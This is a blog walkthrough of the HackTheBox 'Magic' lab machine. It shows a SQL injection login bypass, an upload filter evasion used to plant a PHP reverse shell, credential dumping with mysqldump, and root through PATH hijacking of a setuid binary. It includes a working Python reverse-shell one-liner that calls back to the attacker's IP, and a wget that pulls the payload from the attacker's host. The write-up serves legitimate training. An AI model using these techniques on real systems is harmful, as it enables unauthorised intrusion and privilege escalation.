---
layout: post
title: "HackTheBox - Magic"
description: "Walkthrough of Magic box on Hackthebox."
thumb_image: "documentation/magicthumb.jpg"
tags: [ hackthebox ]
---

{% include image.html path="documentation/magic.webp"
path-detail="documentation/magic.webp"
alt="HTB Magic" %}

## HTB - MAGIC

IP - 10.10.10.185

### Overview

This box was a medium level linux box on HTB created by [TRX](https://www.hackthebox.eu/home/users/profile/31190), it started with a sqli in the login page which redirected us to an upload page. We use that upload page to upload a php reverse shell to the server which was a liltle pain as it was checking the file headers and extensions of the files getting uploaded. After getting a revshell we start enumeration. While enumerating the web directory we get the database creds in a file `db.php5` but `mysql` wasn’t installed on the box so we dumped the db using `mysqldump` and finally got user. For root we ran linpeas on server and it stated we can run and read a file `/bin/sysinfo` on the box and doing a bit on enum on that elf executable we figure out, it is calling some executables like `fdisk` and running the with escalated perms so we ended up creating a python rev shell and name it `fdisk` then we change the `PATH` variable and then run `sysinfo` executable to get root access on the box.

### Enumeration

As always let’s start off with nmap script nmap -sC for default scripts ~~Alright, if it isn’t obvious yet I am a IPPSEC fanboi.~~ Aight, firing up nmap to scan all open ports on the box.

{% highlight bash %}
nmap -sC -sV -oA nmap/results 10.10.10.185
{% endhighlight %} 
And here is our nmap result
{% highlight bash %}
Nmap scan report for 10.10.10.185
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 13 00:46:13 2020 -- 1 IP address (1 host up) scanned in 46.94 seconds
{% endhighlight %}

Open services SSH on port 22 and webserver on port 80. As there aren’t many attacks possible on ssh so I am gonna shift my focus on the web server.

#### Enumerating the web server

The site looks like a web service where authorized user can upload images.

{% include image.html path="documentation/magichome.webp"
path-detail="documentation/magichome.webp"
alt="HTB Magic" %}

Checking the info that [wappalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/) extracted for us from the headers. It seems like the website has php on backend and webserver is apache, nmap also showed us that the webserver is apache.

Alright let’s run something on backend and start exploring the website, because we always want to keep some enumeration running ~~Told ya already, I am a ippsec fanboi.~~ So firing up the gobuster scan to find hidden directories, and i am also looking txt and php files(incase we find some notes or some hidden webpage).

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Magic]
└──╼ $gobuster dir -u http://10.10.10.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gobuster_result -t 120
{% endhighlight %} 

#### Foothold

{% include image.html path="documentation/magiclogin.webp"
path-detail="documentation/magiclogin.webp"
alt="HTB Magic" %}

Alright coming back to the webpage we can see the text on lower left corner `login to upload images`, I am guessing we can upload a php reverse shell on the box after logining in. Can’t find any creds or usernames on the website so i am trying basic sqli payloads. Alright it’s sqli injectable passing `' or 1=1 --` to both username and password field, And we get a login bypass which redirected up to the `uploads.php` page.

{% include image.html path="documentation/magicupload.webp"
path-detail="documentation/magicupload.webp"
alt="HTB Magic" %}

Uploading a simple image to test the upload feature. _Uploading the same image i used for this blog’s thumbnail._

{% include image.html path="documentation/magicsimpleupload.webp"
path-detail="documentation/magicsimpleupload.webp"
alt="HTB Magic" %}

We can see it get uploaded to the webpage on a path `http://10.10.10.185/images/uploads/magicthumb.jpg`, That is `http://10.10.10.185/images/uploads/` + `nameofthefileweuploaded.ext`. Alright, time to try and upload a php reverse shell, i am using the one by pentest monkey, you can get it from [here](https://github.com/pentestmonkey/php-reverse-shell).

{% include image.html path="documentation/magicuploadfailone.webp"
path-detail="documentation/magicuploadfailone.webp"
alt="HTB Magic" %}

Alright it seems like it is doing a check for png,jpeg… images. let’s try to fool the server by adding `ÿØÿÛ` as the first line of the shell, here we are trying to manipulate the file header so server accept it as image.

{% include image.html path="documentation/magicuploadfailone.webp"
path-detail="documentation/magicuploadfailone.webp"
alt="HTB Magic" %}

we still get the same error, renaming the file from `shell.php` to `shell.php.jpeg` and uploading it to the server. 

{% include image.html path="documentation/magicuploadworked.webp"
path-detail="documentation/magicuploadworked.webp"
alt="HTB Magic" %}

Alright.. Opening up a netcat listener on our local machine `rlwrap nc -lvnp 9889`and navigating to `http://10.10.10.185/images/uploads/shell.php.jpeg` and the page starts endless loading, which is good sign, looking at our nc listner and looks like we got a shell on the server. ~~Trust me I wasn’t trying to sound like Ippsec.~~

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Magic]
└──╼ $rlwrap nc -lvnp 9889
listening on [any] 9889 ...
connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 34046
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:39:37 up 1 day,  9:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: cant access tty; job control turned off
$ whoami
www-data
$ 
{% endhighlight %} 

### Getting User

Spawing a tty shell, I like to work with a tty shell so [here](https://netsec.ws/?p=337) is a cheatlist you guys can refer to get a tty shell.

{% highlight bash %}
$ python -c 'import pty; pty.spawn("/bin/sh")'
/bin/sh: 2: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ export TERM=xterm
export TERM=xterm
$ ls
ls
bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib	     media	 proc  sbin  swapfile  usr  vmlinuz.old
$ 
{% endhighlight %} 

First thing i usually do after getting a tty shell is running `linpeas.sh`, but wasn’t able to anything intresting which `www-data` can use to get a privesc to user. So on enumerating the `/var/www/Magic` folder on the webserver we find a file `db.php5` which had the mysql database creds of user `theseus`.

{% highlight php5 %}
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
{% endhighlight %} 

I tried to use `mysql` and funny, it wasn’t installed on the box, i quickly googled about ways to dump mysql database and got to know about a tool `mysqldump`(funfact it was on the server).

{% highlight bash %}
mysqldump Magic -utheseus -piamkingtheseus
...
LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
...
{% endhighlight %} 

`...` represents random(not usefull for us) content, alright so we got another password. So now we have one username `theseus`(a user on box) and two passwords `iamkindtheseus` and `Th3s3usW4sK1ng`.
su theseus tried both passwords and the correct creds were `theseus:Th3s3usW4sK1ng`.

Alright we got the user on box
{% highlight bash %}
theseus@ubuntu:~$ cat user.txt | wc -c
cat user.txt | wc -c
33
theseus@ubuntu:~$
{% endhighlight %} 

### Rooting the box

Running `linpeas.sh` on the server, if you don’t know about linpeas you can get it from their github repo. Basically it is a bash script that finds some privilage escalation vectors for us by performing basic recon. So on running we find this.

{% highlight bash %}
[+] Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
{% endhighlight %} 

Intresting, on running file command we find that it is a elf executable theseus@ubuntu:~$ file /bin/sysinfo

{% highlight bash %}
file /bin/sysinfo
/bin/sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped
{% endhighlight %} 

Executed the binary to see what it is actually doing and seems like it is trying running some system checks, but to me it seems like it is running some system commands to get the result.
Did a strings command to know more about the executable.

{% highlight bash %}
...
popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
;*3$"
...
{% endhighlight %} 

So seems like the executable is using commands like `lshw` and `fdisk`, I am pretty confident that fdisk requires sudo perms to run.
{% highlight bash %}
theseus@ubuntu:~$ fdisk -l
fdisk -l
fdisk: cannot open /dev/loop0: Permission denied
fdisk: cannot open /dev/loop1: Permission denied
fdisk: cannot open /dev/loop2: Permission denied
fdisk: cannot open /dev/loop3: Permission denied
fdisk: cannot open /dev/loop4: Permission denied
fdisk: cannot open /dev/loop5: Permission denied
fdisk: cannot open /dev/loop6: Permission denied
fdisk: cannot open /dev/loop7: Permission denied
fdisk: cannot open /dev/sr0: Permission denied
fdisk: cannot open /dev/fd0: Permission denied
fdisk: cannot open /dev/sda: Permission denied
fdisk: cannot open /dev/loop8: Permission denied
fdisk: cannot open /dev/loop9: Permission denied
fdisk: cannot open /dev/loop10: Permission denied
fdisk: cannot open /dev/loop11: Permission denied
{% endhighlight %}

Tried it on box and yes, fdisk requires sudo permission to run this implies the script is running lshw and fdisk as sudo/privilaged permissions. Hoping the executable is using relative paths we me move to the `/tmp` directory and create a python3 reverse shell and name it `fdisk`.

{% highlight bash %}
theseus@ubuntu:/$ cd /tmp
cd /tmp
# I tried...
theseus@ubuntu:/tmp$ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.169",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > fdisk
# but this didn't worked for me due ",' signs so i created it on my local machine using vim and then uploaded it on the box by creating a python3 http server and `wget`-ing the fdisk file.
theseus@ubuntu:/tmp$ wget http://10.10.14.169:8000/fdisk
wget http://10.10.14.169:8000/fdisk
--2020-07-19 08:45:42--  http://10.10.14.169:8000/fdisk
Connecting to 10.10.14.169:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 230 [application/octet-stream]
Saving to: ‘fdisk2’

fdisk               [===================>]     230  --.-KB/s    in 0s      

2020-07-19 08:45:43 (44.4 MB/s) - ‘fdisk’ saved [230/230]
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ chmod +x fdisk
{% endhighlight %} 

Next we need to export PATH variable as /tmp:(old PATH variable) so that when `sysinfo` executable gets executed it searches for `fdisk` in tmp directory first then in rest of the path.

{% highlight bash %}
theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
{% endhighlight %} 

Starting the nmap listener on local machine `nc -lvnp 9999`. And then running `sysinfo` executable on box.
Yeet we got a reverse shell with root.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Magic]
└──╼ $rlwrap nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 40024
# whoami
root
# cat /root/root.txt | wc -c
33
{% endhighlight %} 

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.